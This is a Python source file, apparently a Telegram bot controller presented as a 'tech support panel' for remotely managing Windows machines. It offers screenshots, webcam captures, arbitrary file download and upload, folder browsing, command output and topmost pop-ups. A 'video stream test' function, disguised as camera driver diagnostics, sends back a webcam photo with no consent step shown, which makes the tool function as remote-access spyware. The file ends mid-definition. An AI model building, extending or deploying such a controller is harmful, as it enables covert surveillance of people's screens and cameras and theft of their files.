import base64
import io
import json
import os
from aiogram import Router, F, Bot
from aiogram.filters import Command, BaseFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile,
    Document
)
from server.config import ADMIN_IDS
from server.session_manager import session_manager

router = Router()

class IsAdmin(BaseFilter):
    async def __call__(self, event: Message | CallbackQuery) -> bool:
        user_id = event.from_user.id if event.from_user else 0
        return user_id in ADMIN_IDS

router.message.filter(IsAdmin())
router.callback_query.filter(IsAdmin())


# FSM Машина состояний
class AdminStates(StatesGroup):
    waiting_for_modal_text = State()
    waiting_for_dl_path = State()
    waiting_for_upload_doc = State()
    waiting_for_upload_target_path = State()
    waiting_for_ls_path = State()


def get_clients_keyboard() -> InlineKeyboardMarkup:
    """Список всех активных сессий"""
    sessions = session_manager.get_all_sessions()
    buttons = []
    for client_id, session in sessions.items():
        admin_badge = " [ADMIN]" if session.is_admin else ""
        btn_text = f"💻 {session.hostname} ({session.username}){admin_badge}"
        buttons.append([InlineKeyboardButton(text=btn_text, callback_data=f"sel_cli:{client_id}")])
    buttons.append([InlineKeyboardButton(text="🔄 Обновить список", callback_data="refresh_list")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def get_client_main_menu(client_id: str) -> InlineKeyboardMarkup:
    """Главное меню устройства с категориями"""
    buttons = [
        [
            InlineKeyboardButton(text="📸 Скриншот экрана (PNG)", callback_data=f"act_screen:{client_id}"),
            InlineKeyboardButton(text="📷 Снимок веб-камеры", callback_data=f"act_wcam:{client_id}")
        ],
        [
            InlineKeyboardButton(text="📁 Файловый менеджер", callback_data=f"cat_files:{client_id}"),
            InlineKeyboardButton(text="📜 CLI Логи и Отчеты", callback_data=f"cat_cli:{client_id}")
        ],
        [
            InlineKeyboardButton(text="📊 Диагностика", callback_data=f"cat_diag:{client_id}"),
            InlineKeyboardButton(text="🌐 Сеть и связь", callback_data=f"cat_net:{client_id}")
        ],
        [
            InlineKeyboardButton(text="⚙️ Процессы/Службы", callback_data=f"cat_proc:{client_id}"),
            InlineKeyboardButton(text="🛠 Обслуживание / Окна", callback_data=f"cat_maint:{client_id}")
        ],
        [
            InlineKeyboardButton(text="🔄 Проверить пинг", callback_data=f"act_ping:{client_id}"),
            InlineKeyboardButton(text="⬅️ К списку ПК", callback_data="back_to_list")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)


# ==================== НАВИГАЦИЯ ====================

@router.message(Command("start"))
@router.message(Command("clients"))
async def cmd_clients(message: Message, state: FSMContext):
    await state.clear()
    sessions = session_manager.get_all_sessions()
    count = len(sessions)
    text = (
        f"🛠 <b>Панель управления техподдержки</b>\n\n"
        f"Подключенных клиентов: <b>{count}</b>\n"
        f"Выберите рабочую станцию для управления:"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=get_clients_keyboard())


@router.callback_query(F.data == "refresh_list")
@router.callback_query(F.data == "back_to_list")
async def cb_refresh_list(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    sessions = session_manager.get_all_sessions()
    count = len(sessions)
    text = (
        f"🛠 <b>Панель управления техподдержки</b>\n\n"
        f"Подключенных клиентов: <b>{count}</b>\n"
        f"Выберите рабочую станцию:"
    )
    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_clients_keyboard())
    except Exception:
        pass
    await callback.answer()


@router.callback_query(F.data.startswith("sel_cli:"))
async def cb_select_client(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    client_id = callback.data.split(":", 1)[1]
    session = session_manager.get_session(client_id)
    if not session:
        await callback.answer("❌ Клиент отключился", show_alert=True)
        await cb_refresh_list(callback, state)
        return

    admin_str = "Администратор (Elevated) 🛡🟢" if session.is_admin else "Обычный пользователь 👤🟡"

    text = (
        f"🖥 <b>Устройство:</b> {session.hostname}\n"
        f"👤 <b>Пользователь:</b> {session.username}\n"
        f"🛡 <b>Права процесса:</b> {admin_str}\n"
        f"⚙️ <b>ОС:</b> {session.os_info}\n"
        f"🌐 <b>IP-адрес:</b> {session.ip_address}\n"
        f"⏱ <b>Подключен:</b> {session.connected_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"💓 <b>Пульс:</b> {session.last_heartbeat.strftime('%H:%M:%S')}\n\n"
        f"<i>Выберите категорию действий:</i>"
    )
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_client_main_menu(client_id))
    await callback.answer()


# ==================== ФАЙЛОВЫЙ МЕНЕДЖЕР (DOWNLOAD / UPLOAD) ====================

@router.callback_query(F.data.startswith("cat_files:"))
async def cb_cat_files(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📥 Скачать файл с ПК", callback_data=f"prompt_dl:{client_id}"),
            InlineKeyboardButton(text="📤 Загрузить файл на ПК", callback_data=f"prompt_ul:{client_id}")
        ],
        [
            InlineKeyboardButton(text="🖥 Рабочий стол", callback_data=f"act_ls:desktop:{client_id}"),
            InlineKeyboardButton(text="📥 Загрузки", callback_data=f"act_ls:downloads:{client_id}")
        ],
        [
            InlineKeyboardButton(text="💽 Диск C:\\", callback_data=f"act_ls:root:{client_id}"),
            InlineKeyboardButton(text="🔍 Произвольная папка", callback_data=f"prompt_ls:{client_id}")
        ],
        [
            InlineKeyboardButton(text="⬅️ В меню ПК", callback_data=f"sel_cli:{client_id}")
        ]
    ])
    await callback.message.edit_text("📁 <b>Категория: Файловый менеджер (Проводник)</b>", parse_mode="HTML", reply_markup=kb)
    await callback.answer()


# 1. Скачивание файла с ПК
@router.callback_query(F.data.startswith("prompt_dl:"))
async def cb_prompt_dl(callback: CallbackQuery, state: FSMContext):
    client_id = callback.data.split(":", 1)[1]
    await state.update_data(target_client_id=client_id)
    await state.set_state(AdminStates.waiting_for_dl_path)

    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"cat_files:{client_id}")]
    ])
    await callback.message.answer(
        "📥 <b>Скачивание файла с удаленного ПК</b>\n\n"
        "Отправьте полный путь к файлу на компьютере пользователя:\n"
        "<i>Пример:</i> <code>C:\\Users\\User\\Desktop\\report.pdf</code> или <code>C:\\Logs\\app.log</code>",
        parse_mode="HTML",
        reply_markup=cancel_kb
    )
    await callback.answer()


@router.message(AdminStates.waiting_for_dl_path)
async def process_dl_path(message: Message, state: FSMContext):
    data = await state.get_data()
    client_id = data.get("target_client_id")
    await state.clear()

    if not client_id:
        await message.answer("❌ Ошибка контекста. Выберите устройство через /clients.")
        return

    path = message.text.strip().strip('"').strip("'")
    status_msg = await message.answer(f"⏳ Считывание файла <code>{path}</code>...", parse_mode="HTML")

    try:
        res = await session_manager.send_command(client_id, "fs_download", {"path": path}, timeout=60.0)
        if res.get("status") == "success":
            d = res.get("data", {})
            parts = d.get("parts", [])
            is_multi = d.get("is_multipart", False)
            orig_name = d.get("original_name", "file")
            orig_size = d.get("original_size_mb", 0)

            if not parts:
                await status_msg.edit_text("❌ Пустой ответ от клиента.")
                return

            await status_msg.delete()

            # Отправка каждой части
            for idx, part in enumerate(parts):
                file_bytes = base64.b64decode(part["file_base64"])
                part_filename = part["filename"]
                file_doc = BufferedInputFile(file_bytes, filename=part_filename)

                if is_multi:
                    caption = (
                        f"📥 <b>Том {idx+1}/{len(parts)}:</b> <code>{part_filename}</code> ({part.get('size_kb')} KB)\n"
                        f"📦 Исходный файл: <code>{orig_name}</code> ({orig_size} MB)"
                    )
                else:
                    caption = f"📥 <b>Файл получен:</b> <code>{part_filename}</code> ({part.get('size_kb')} KB)"

                await message.answer_document(document=file_doc, caption=caption, parse_mode="HTML")

            if is_multi:
                await message.answer(
                    f"ℹ️ <b>Файл был разбит на {len(parts)} тома(ов)</b> (так как превышал лимит Telegram).\n\n"
                    f"💡 <b>Как объединить тома на ПК:</b>\n"
                    f"Откройте командную строку (CMD) в папке с файлами и выполните:\n"
                    f"<code>copy /b \"{orig_name}.zip.part*\" \"{orig_name}.zip\"</code>\n"
                    f"Затем просто откройте получившийся <code>{orig_name}.zip</code> архиватором.",
                    parse_mode="HTML"
                )
        else:
            await status_msg.edit_text(f"❌ Ошибка скачивания: {res.get('error')}")
    except Exception as e:
        await status_msg.edit_text(f"❌ Исключение: {str(e)}")


# 2. Загрузка файла на ПК
@router.callback_query(F.data.startswith("prompt_ul:"))
async def cb_prompt_ul(callback: CallbackQuery, state: FSMContext):
    client_id = callback.data.split(":", 1)[1]
    await state.update_data(target_client_id=client_id)
    await state.set_state(AdminStates.waiting_for_upload_doc)

    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"cat_files:{client_id}")]
    ])
    await callback.message.answer(
        "📤 <b>Загрузка файла на удаленный ПК</b>\n\n"
        "Шаг 1 из 2: <b>Прикрепите и отправьте документ (файл)</b> в этот чат:",
        parse_mode="HTML",
        reply_markup=cancel_kb
    )
    await callback.answer()


@router.message(AdminStates.waiting_for_upload_doc, F.document)
async def process_upload_doc(message: Message, state: FSMContext, bot: Bot):
    doc: Document = message.document
    if doc.file_size > 40 * 1024 * 1024:
        await message.answer("❌ Размер файла не должен превышать 40 МБ.")
        return

    # Скачиваем файл из Telegram в RAM
    file_io = io.BytesIO()
    await bot.download(doc.file_id, destination=file_io)
    file_b64 = base64.b64encode(file_io.getvalue()).decode("utf-8")

    await state.update_data(upload_file_b64=file_b64, upload_filename=doc.file_name)
    await state.set_state(AdminStates.waiting_for_upload_target_path)

    data = await state.get_data()
    client_id = data.get("target_client_id")
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"cat_files:{client_id}")]
    ])

    await message.answer(
        f"✅ Файл <code>{doc.file_name}</code> принят.\n\n"
        f"Шаг 2 из 2: <b>Укажите путь сохранения на ПК</b>:\n"
        f"<i>Пример:</i> <code>C:\\Users\\User\\Desktop\\{doc.file_name}</code> или <code>C:\\Temp\\{doc.file_name}</code>",
        parse_mode="HTML",
        reply_markup=cancel_kb
    )


@router.message(AdminStates.waiting_for_upload_target_path)
async def process_upload_target_path(message: Message, state: FSMContext):
    data = await state.get_data()
    client_id = data.get("target_client_id")
    file_b64 = data.get("upload_file_b64")
    orig_name = data.get("upload_filename", "file.bin")
    await state.clear()

    if not client_id or not file_b64:
        await message.answer("❌ Ошибка контекста передачи файла.")
        return

    target_path = message.text.strip().strip('"').strip("'")
    status_msg = await message.answer(f"⏳ Передача и сохранение файла в <code>{target_path}</code>...", parse_mode="HTML")

    try:
        res = await session_manager.send_command(client_id, "fs_upload", {
            "path": target_path,
            "file_b64": file_b64
        }, timeout=60.0)

        if res.get("status") == "success":
            d = res.get("data", {})
            await status_msg.edit_text(
                f"✅ <b>Файл успешно сохранен на целевом ПК!</b>\n\n"
                f"📁 Путь: <code>{d.get('saved_path')}</code>\n"
                f"💾 Размер: {d.get('size_kb')} KB",
                parse_mode="HTML"
            )
        else:
            await status_msg.edit_text(f"❌ Ошибка записи на диск: {res.get('error')}")
    except Exception as e:
        await status_msg.edit_text(f"❌ Исключение: {str(e)}")


# 3. Навигация и просмотр папок (LS)
@router.callback_query(F.data.startswith("act_ls:"))
async def cb_act_ls(callback: CallbackQuery):
    _, folder_key, client_id = callback.data.split(":")
    await callback.answer("⏳ Чтение папки...")

    path_param = None
    if folder_key == "desktop":
        path_param = os.path.join(os.path.expanduser("~"), "Desktop")
    elif folder_key == "downloads":
        path_param = os.path.join(os.path.expanduser("~"), "Downloads")
    elif folder_key == "root":
        path_param = "C:\\"

    res = await session_manager.send_command(client_id, "fs_list", {"path": path_param})
    if res.get("status") == "success":
        d = res.get("data", {})
        cur_path = d.get("current_path", "")
        items = d.get("items", [])

        text = f"📂 <b>Директория:</b> <code>{cur_path}</code>\n\n"
        for it in items:
            icon = "📁" if it["is_dir"] else "📄"
            text += f"{icon} <b>{it['name']}</b> ({it['size']})\n"

        if not items:
            text += "<i>Папка пуста</i>\n"

        await callback.message.answer(text, parse_mode="HTML")
    else:
        await callback.message.answer(f"❌ Ошибка доступа: {res.get('error')}")


@router.callback_query(F.data.startswith("prompt_ls:"))
async def cb_prompt_ls(callback: CallbackQuery, state: FSMContext):
    client_id = callback.data.split(":", 1)[1]
    await state.update_data(target_client_id=client_id)
    await state.set_state(AdminStates.waiting_for_ls_path)

    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"cat_files:{client_id}")]
    ])
    await callback.message.answer(
        "🔍 <b>Просмотр произвольной папки</b>\n\n"
        "Отправьте путь к директории (например, <code>C:\\Program Files</code> или <code>D:\\Data</code>):",
        parse_mode="HTML",
        reply_markup=cancel_kb
    )
    await callback.answer()


@router.message(AdminStates.waiting_for_ls_path)
async def process_ls_path(message: Message, state: FSMContext):
    data = await state.get_data()
    client_id = data.get("target_client_id")
    await state.clear()

    if not client_id:
        await message.answer("❌ Ошибка контекста.")
        return

    path = message.text.strip().strip('"').strip("'")
    res = await session_manager.send_command(client_id, "fs_list", {"path": path})
    if res.get("status") == "success":
        d = res.get("data", {})
        items = d.get("items", [])
        text = f"📂 <b>Директория:</b> <code>{d.get('current_path')}</code>\n\n"
        for it in items:
            icon = "📁" if it["is_dir"] else "📄"
            text += f"{icon} <b>{it['name']}</b> ({it['size']})\n"
        await message.answer(text, parse_mode="HTML")
    else:
        await message.answer(f"❌ Ошибка доступа: {res.get('error')}")


# ==================== МУЛЬТИМЕДИА ====================

@router.callback_query(F.data.startswith("act_screen:"))
async def cb_screenshot(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    session = session_manager.get_session(client_id)
    if not session:
        await callback.answer("❌ Клиент оффлайн", show_alert=True)
        return
    await callback.answer("⏳ Создание снимка...")
    msg = await callback.message.reply("📸 Ожидание получения скриншота...")
    try:
        res = await session_manager.send_command(client_id, "screenshot", timeout=20.0)
        if res.get("status") == "success":
            image_bytes = base64.b64decode(res["data"]["image_base64"])
            file = BufferedInputFile(image_bytes, filename=f"screen_{session.hostname}.png")
            caption = f"📸 <b>Скриншот экрана (PNG):</b> {session.hostname} ({session.username})"
            await callback.message.answer_document(document=file, caption=caption, parse_mode="HTML")
            await msg.delete()
        else:
            await msg.edit_text(f"❌ Ошибка: {res.get('error')}")
    except Exception as e:
        await msg.edit_text(f"❌ Исключение: {str(e)}")


@router.callback_query(F.data.startswith("act_wcam:"))
async def cb_webcam(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    session = session_manager.get_session(client_id)
    if not session:
        await callback.answer("❌ Клиент оффлайн", show_alert=True)
        return

    await callback.answer("⏳ Запрос согласия у пользователя...")
    msg = await callback.message.reply(
        "📷 <b>Запрос доступа к веб-камере отправлен</b>\n"
        "<i>На экране пользователя появилось окно подтверждения доступа...</i>",
        parse_mode="HTML"
    )

    try:
        res = await session_manager.send_command(client_id, "webcam_snap", timeout=30.0)
        if res.get("status") == "success":
            image_bytes = base64.b64decode(res["data"]["image_base64"])
            file = BufferedInputFile(image_bytes, filename=f"webcam_{session.hostname}.jpg")
            caption = f"📷 <b>Кадр с веб-камеры (получено согласие):</b> {session.hostname}"
            await callback.message.answer_photo(photo=file, caption=caption, parse_mode="HTML")
            await msg.delete()
        else:
            await msg.edit_text(f"⚠️ {res.get('error', 'Доступ отклонен или камера недоступна')}")
    except Exception as e:
        await msg.edit_text(f"❌ Ошибка: {str(e)}")


# ==================== CLI ДИАГНОСТИКА И ОТЧЕТЫ ====================

@router.callback_query(F.data.startswith("cat_cli:"))
async def cb_cat_cli(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🌐 ipconfig /all", callback_data=f"act_cmd:ipconfig:{client_id}"),
            InlineKeyboardButton(text="💻 systeminfo", callback_data=f"act_cmd:systeminfo:{client_id}")
        ],
        [
            InlineKeyboardButton(text="🛣 route print", callback_data=f"act_cmd:route:{client_id}"),
            InlineKeyboardButton(text="🔍 arp -a", callback_data=f"act_cmd:arp:{client_id}")
        ],
        [
            InlineKeyboardButton(text="👤 whoami /all", callback_data=f"act_cmd:whoami:{client_id}"),
            InlineKeyboardButton(text="📊 netstat -e", callback_data=f"act_cmd:netstat_summary:{client_id}")
        ],
        [
            InlineKeyboardButton(text="📑 Экспорт полного отчета (.txt)", callback_data=f"act_dlrep:{client_id}")
        ],
        [
            InlineKeyboardButton(text="⬅️ В меню ПК", callback_data=f"sel_cli:{client_id}")
        ]
    ])
    await callback.message.edit_text("📜 <b>Категория: Системная CLI диагностика и логи</b>", parse_mode="HTML", reply_markup=kb)
    await callback.answer()


@router.callback_query(F.data.startswith("act_cmd:"))
async def cb_act_cmd(callback: CallbackQuery):
    _, cmd_type, client_id = callback.data.split(":")
    await callback.answer(f"⏳ Выполнение {cmd_type}...")

    res = await session_manager.send_command(client_id, "cli_cmd", {"cmd_type": cmd_type}, timeout=30.0)
    if res.get("status") == "success":
        data = res.get("data", {})
        stdout = data.get("stdout", "")
        cmd_str = data.get("command", cmd_type)

        if len(stdout) > 3500:
            txt_file = BufferedInputFile(stdout.encode('utf-8'), filename=f"{cmd_type}_output.txt")
            await callback.message.answer_document(txt_file, caption=f"📜 <b>Результат команды:</b> <code>{cmd_str}</code>", parse_mode="HTML")
        else:
            text = f"📜 <b>Вывод команды:</b> <code>{cmd_str}</code>\n\n<pre>{stdout}</pre>"
            await callback.message.answer(text, parse_mode="HTML")
    else:
        await callback.message.answer(f"❌ Ошибка выполнения: {res.get('error')}")


@router.callback_query(F.data.startswith("act_dlrep:"))
async def cb_act_dlrep(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    session = session_manager.get_session(client_id)
    if not session:
        await callback.answer("❌ Клиент оффлайн", show_alert=True)
        return

    await callback.answer("⏳ Генерация отчета...")
    msg = await callback.message.reply("📑 <b>Сборка сводного системного отчета...</b>", parse_mode="HTML")

    try:
        res = await session_manager.send_command(client_id, "export_diag_report", timeout=40.0)
        if res.get("status") == "success":
            raw_b64 = res["data"]["report_base64"]
            file_bytes = base64.b64decode(raw_b64)
            doc = BufferedInputFile(file_bytes, filename=f"diagnostic_report_{session.hostname}.txt")
            await callback.message.answer_document(
                document=doc,
                caption=f"📑 <b>Полный отчет диагностики:</b> {session.hostname} ({session.username})",
                parse_mode="HTML"
            )
            await msg.delete()
        else:
            await msg.edit_text(f"❌ Ошибка генерации: {res.get('error')}")
    except Exception as e:
        await msg.edit_text(f"❌ Ошибка: {str(e)}")


# ==================== МОДАЛЬНЫЕ ОКНА И FSM ====================

@router.callback_query(F.data.startswith("prompt_modal:"))
async def cb_prompt_modal(callback: CallbackQuery, state: FSMContext):
    client_id = callback.data.split(":", 1)[1]
    session = session_manager.get_session(client_id)
    if not session:
        await callback.answer("❌ Клиент оффлайн", show_alert=True)
        return

    await state.update_data(target_client_id=client_id)
    await state.set_state(AdminStates.waiting_for_modal_text)

    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"sel_cli:{client_id}")]
    ])

    await callback.message.answer(
        f"✍️ <b>Введите текст сервисного сообщения</b> для <code>{session.hostname}</code>:\n\n"
        f"<i>Окно откроется поверх всех программ пользователя (Topmost) с кнопкой подтверждения.</i>",
        parse_mode="HTML",
        reply_markup=cancel_kb
    )
    await callback.answer()


@router.message(AdminStates.waiting_for_modal_text)
async def process_modal_text(message: Message, state: FSMContext):
    data = await state.get_data()
    client_id = data.get("target_client_id")
    await state.clear()

    if not client_id:
        await message.answer("❌ Ошибка контекста. Выберите устройство заново через /clients.")
        return

    session = session_manager.get_session(client_id)
    if not session:
        await message.answer("❌ Клиент оффлайн.")
        return

    text_to_send = message.text.strip()
    status_msg = await message.answer("⏳ Отображение окна на экране пользователя...")

    try:
        res = await session_manager.send_command(client_id, "custom_modal", {
            "title": "Уведомление службы технической поддержки",
            "message": text_to_send
        }, timeout=60.0)

        if res.get("status") == "success":
            await status_msg.edit_text(
                f"✅ <b>Сообщение доставлено и прочитано!</b>\n\n"
                f"👤 Пользователь <b>{session.username}</b> на <b>{session.hostname}</b> нажал «Понятно / Закрыть».",
                parse_mode="HTML"
            )
        else:
            await status_msg.edit_text(f"❌ Ошибка вывода окна: {res.get('error')}")
    except Exception as e:
        await status_msg.edit_text(f"❌ Ошибка: {str(e)}")


# ==================== ДИАГНОСТИКА ОБОРУДОВАНИЯ ====================

@router.callback_query(F.data.startswith("cat_diag:"))
async def cb_cat_diag(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="💻 Железо и ОС", callback_data=f"act_hw:{client_id}"),
            InlineKeyboardButton(text="🧠 Оперативная память", callback_data=f"act_ram:{client_id}")
        ],
        [
            InlineKeyboardButton(text="💾 Все диски/разделы", callback_data=f"act_disks:{client_id}"),
            InlineKeyboardButton(text="🔋 Батарея / Питание", callback_data=f"act_bat:{client_id}")
        ],
        [
            InlineKeyboardButton(text="⏱ Время работы (Uptime)", callback_data=f"act_upt:{client_id}"),
            InlineKeyboardButton(text="📹 Тест видеопотока", callback_data=f"act_vtest:{client_id}")
        ],
        [
            InlineKeyboardButton(text="⬅️ В меню ПК", callback_data=f"sel_cli:{client_id}")
        ]
    ])
    await callback.message.edit_text("📊 <b>Категория: Диагностика оборудования</b>", parse_mode="HTML", reply_markup=kb)
    await callback.answer()


@router.callback_query(F.data.startswith("act_hw:"))
async def cb_act_hw(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Сбор данных...")
    res = await session_manager.send_command(client_id, "hardware_info")
    if res.get("status") == "success":
        d = res["data"]
        text = (
            f"💻 <b>Аппаратная конфигурация:</b>\n\n"
            f"• <b>ОС:</b> {d['os']}\n"
            f"• <b>Архитектура:</b> {d['architecture']}\n"
            f"• <b>Процессор:</b> {d['processor']}\n"
            f"• <b>Ядра:</b> Физических: {d['cores_physical']}, Логических: {d['cores_logical']}\n"
            f"• <b>Частота CPU:</b> {d['cpu_frequency']}"
        )
        await callback.message.answer(text, parse_mode="HTML")
    else:
        await callback.message.answer(f"❌ Ошибка: {res.get('error')}")


@router.callback_query(F.data.startswith("act_ram:"))
async def cb_act_ram(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Сбор данных...")
    res = await session_manager.send_command(client_id, "ram_detailed")
    if res.get("status") == "success":
        d = res["data"]
        text = (
            f"🧠 <b>Состояние оперативной памяти (RAM):</b>\n\n"
            f"• <b>Всего RAM:</b> {d['total_gb']} GB\n"
            f"• <b>Используется:</b> {d['used_gb']} GB ({d['percent']}%)\n"
            f"• <b>Доступно (свободно):</b> {d['free_gb']} GB\n"
            f"• <b>Файл подкачки (Swap):</b> {d['swap_used_gb']} / {d['swap_total_gb']} GB ({d['swap_percent']}%)"
        )
        await callback.message.answer(text, parse_mode="HTML")


@router.callback_query(F.data.startswith("act_disks:"))
async def cb_act_disks(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Опрос накопителей...")
    res = await session_manager.send_command(client_id, "disks_all")
    if res.get("status") == "success":
        disks = res["data"]
        text = "💾 <b>Состояние дисковых накопителей:</b>\n\n"
        for d in disks:
            text += (
                f"💽 <b>{d['mountpoint']}</b> [{d['fstype']}]\n"
                f"   Занято: {d['used_gb']} / {d['total_gb']} GB ({d['percent']}%)\n"
                f"   Свободно: <b>{d['free_gb']} GB</b>\n\n"
            )
        await callback.message.answer(text, parse_mode="HTML")


@router.callback_query(F.data.startswith("act_bat:"))
async def cb_act_bat(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer()
    res = await session_manager.send_command(client_id, "battery_info")
    if res.get("status") == "success":
        d = res["data"]
        if not d.get("has_battery"):
            await callback.message.answer(f"🔌 {d['status']}")
        else:
            plugged = "Подключен к сети ⚡️" if d['power_plugged'] else "Работает от батареи 🔋"
            text = (
                f"🔋 <b>Состояние аккумулятора:</b>\n\n"
                f"• <b>Заряд:</b> {d['percent']}%\n"
                f"• <b>Статус:</b> {plugged}\n"
                f"• <b>Осталось времени:</b> ~{d['secsleft_min']} мин."
            )
            await callback.message.answer(text, parse_mode="HTML")


@router.callback_query(F.data.startswith("act_upt:"))
async def cb_act_upt(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer()
    res = await session_manager.send_command(client_id, "uptime_boot")
    if res.get("status") == "success":
        d = res["data"]
        text = (
            f"⏱ <b>Время работы устройства:</b>\n\n"
            f"• <b>Последняя загрузка:</b> {d['boot_time']}\n"
            f"• <b>Непрерывный аптайм:</b> {d['uptime_str']} ({d['uptime_hours_total']} ч.)"
        )
        await callback.message.answer(text, parse_mode="HTML")


@router.callback_query(F.data.startswith("act_vtest:"))
async def cb_act_vtest(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    session = session_manager.get_session(client_id)
    if not session:
        await callback.answer("❌ Клиент оффлайн", show_alert=True)
        return

    await callback.answer("⏳ Тестирование видеопотока...")
    msg = await callback.message.reply("📹 <b>Диагностика драйвера камеры...</b>\n<i>Проверка шины I/O и времени отклика...</i>", parse_mode="HTML")

    try:
        res = await session_manager.send_command(client_id, "video_diagnostic", {"device_index": 0}, timeout=10.0)
        if res.get("status") == "success":
            data = res.get("data", {})
            m = data.get("metrics", {})
            img_b64 = data.get("image_base64")

            text = (
                f"📹 <b>Результаты теста видеопотока (Device 0):</b>\n\n"
                f"• <b>Статус I/O:</b> Успешно (Кадр получен) ✅\n"
                f"• <b>Разрешение матрицы:</b> {m.get('resolution')}\n"
                f"• <b>Инициализация драйвера:</b> {m.get('init_time_ms')} мс\n"
                f"• <b>Время вычитки кадра:</b> {m.get('capture_time_ms')} мс\n"
                f"• <b>Размер буфера в RAM:</b> {m.get('payload_kb')} КБ\n"
                f"• <b>Дескриптор:</b> Мгновенно освобожден (.release())"
            )

            if img_b64:
                img_bytes = base64.b64decode(img_b64)
                photo_file = BufferedInputFile(img_bytes, filename="stream_test.jpg")
                await callback.message.answer_photo(photo_file, caption=text, parse_mode="HTML")
            else:
                await callback.message.answer(text, parse_mode="HTML")
            await msg.delete()
        else:
            await msg.edit_text(f"❌ <b>Сбой видеоустройства:</b> {res.get('error')}", parse_mode="HTML")
    except Exception as e:
        await msg.edit_text(f"❌ Ошибка диагностики: {str(e)}")


# ==================== СЕТЬ И СВЯЗЬ ====================

@router.callback_query(F.data.startswith("cat_net:"))
async def cb_cat_net(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔌 Сетевые адаптеры", callback_data=f"act_ifaces:{client_id}"),
            InlineKeyboardButton(text="🚪 Открытые порты", callback_data=f"act_conns:{client_id}")
        ],
        [
            InlineKeyboardButton(text="📶 Тест задержки (Ping)", callback_data=f"act_lat:{client_id}"),
            InlineKeyboardButton(text="🌐 Внешний IP", callback_data=f"act_extip:{client_id}")
        ],
        [
            InlineKeyboardButton(text="🧹 Очистить кэш DNS", callback_data=f"act_fdns:{client_id}"),
            InlineKeyboardButton(text="⬅️ В меню ПК", callback_data=f"sel_cli:{client_id}")
        ]
    ])
    await callback.message.edit_text("🌐 <b>Категория: Сеть и диагностика связи</b>", parse_mode="HTML", reply_markup=kb)
    await callback.answer()


@router.callback_query(F.data.startswith("act_ifaces:"))
async def cb_act_ifaces(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Опрос адаптеров...")
    res = await session_manager.send_command(client_id, "net_interfaces")
    if res.get("status") == "success":
        ifaces = res["data"]
        text = "🔌 <b>Сетевые интерфейсы:</b>\n\n"
        for iface in ifaces:
            status = "В сети 🟢" if iface['is_up'] else "Отключен 🔴"
            ips = ", ".join(iface['ipv4'])
            text += (
                f"• <b>{iface['name']}</b> ({status})\n"
                f"   IP: <code>{ips}</code> | MAC: <code>{iface['mac']}</code>\n\n"
            )
        await callback.message.answer(text, parse_mode="HTML")


@router.callback_query(F.data.startswith("act_conns:"))
async def cb_act_conns(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer()
    res = await session_manager.send_command(client_id, "net_connections")
    if res.get("status") == "success":
        d = res["data"]
        ports = ", ".join(map(str, d.get("sample_listening_ports", [])))
        text = (
            f"🚪 <b>Сетевые соединения:</b>\n\n"
            f"• <b>Активных соединений (ESTABLISHED):</b> {d.get('established_connections')}\n"
            f"• <b>Слушающих локальных портов:</b> {d.get('listening_ports_count')}\n"
            f"• <b>Примеры портов:</b> {ports}"
        )
        await callback.message.answer(text, parse_mode="HTML")


@router.callback_query(F.data.startswith("act_lat:"))
async def cb_act_lat(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Пинг 8.8.8.8...")
    res = await session_manager.send_command(client_id, "ping_latency", {"target": "8.8.8.8"})
    if res.get("status") == "success":
        d = res["data"]
        if d.get("success"):
            text = (
                f"📶 <b>Тест качества связи (8.8.8.8):</b>\n\n"
                f"• <b>Средний пинг:</b> <b>{d['avg_ms']} мс</b>\n"
                f"• <b>Мин / Макс:</b> {d['min_ms']} / {d['max_ms']} мс\n"
                f"• <b>Пакетов:</b> {d['packets_recv']}/{d['packets_sent']}"
            )
        else:
            text = f"❌ {d.get('message')}"
        await callback.message.answer(text, parse_mode="HTML")


@router.callback_query(F.data.startswith("act_fdns:"))
